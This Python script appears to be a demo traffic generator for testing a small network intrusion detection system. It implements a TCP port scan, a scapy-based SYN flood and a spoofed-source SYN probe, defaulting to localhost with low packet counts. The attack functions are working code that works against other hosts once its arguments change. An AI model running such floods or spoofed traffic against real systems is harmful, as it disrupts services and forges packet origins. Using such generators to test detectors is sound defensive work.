import argparse
import random
import socket
import time

from scapy.all import IP, TCP, send


def run_port_scan(target_ip: str, start_port: int, end_port: int, delay: float) -> None:
	print(f"[DEMO] Port scan: {target_ip}:{start_port}-{end_port}")
	for port in range(start_port, end_port + 1):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(0.05)
		try:
			s.connect_ex((target_ip, port))
		except OSError:
			pass
		finally:
			s.close()
		if delay > 0:
			time.sleep(delay)
	print("[DEMO] Port scan done")


def run_syn_flood(target_ip: str, target_port: int, count: int, delay: float) -> None:
	print(f"[DEMO] SYN flood: {target_ip}:{target_port} count={count}")
	for _ in range(count):
		packet = IP(dst=target_ip) / TCP(
			sport=random.randint(1024, 65535),
			dport=target_port,
			flags="S",
			seq=random.randint(1, 2**32 - 1),
		)
		send(packet, verbose=False)
		if delay > 0:
			time.sleep(delay)
	print("[DEMO] SYN flood done")


def run_blacklist_probe(target_ip: str, spoofed_src: str, target_port: int, count: int, delay: float) -> None:
	print(f"[DEMO] Blacklist probe: src={spoofed_src} -> {target_ip}:{target_port} count={count}")
	for _ in range(count):
		packet = IP(src=spoofed_src, dst=target_ip) / TCP(
			sport=random.randint(1024, 65535),
			dport=target_port,
			flags="S",
		)
		send(packet, verbose=False)
		if delay > 0:
			time.sleep(delay)
	print("[DEMO] Blacklist probe done")


def main():
	parser = argparse.ArgumentParser(description="Mini NIDS attack demo generator")
	parser.add_argument("--attack", choices=["port-scan", "syn-flood", "blacklist", "all"], default="all")
	parser.add_argument("--target", default="127.0.0.1", help="Target IP")
	parser.add_argument("--target-port", type=int, default=8080)
	parser.add_argument("--start-port", type=int, default=1)
	parser.add_argument("--end-port", type=int, default=60)
	parser.add_argument("--count", type=int, default=40)
	parser.add_argument("--delay", type=float, default=0.005)
	parser.add_argument("--spoofed-src", default="10.0.0.1", help="Must exist in data/blacklist.txt for blacklist demo")
	args = parser.parse_args()

	if args.attack in ("port-scan", "all"):
		run_port_scan(args.target, args.start_port, args.end_port, args.delay)

	if args.attack in ("syn-flood", "all"):
		run_syn_flood(args.target, args.target_port, args.count, args.delay)

	if args.attack in ("blacklist", "all"):
		run_blacklist_probe(args.target, args.spoofed_src, args.target_port, max(3, args.count // 10), args.delay)


if __name__ == "__main__":
	main()
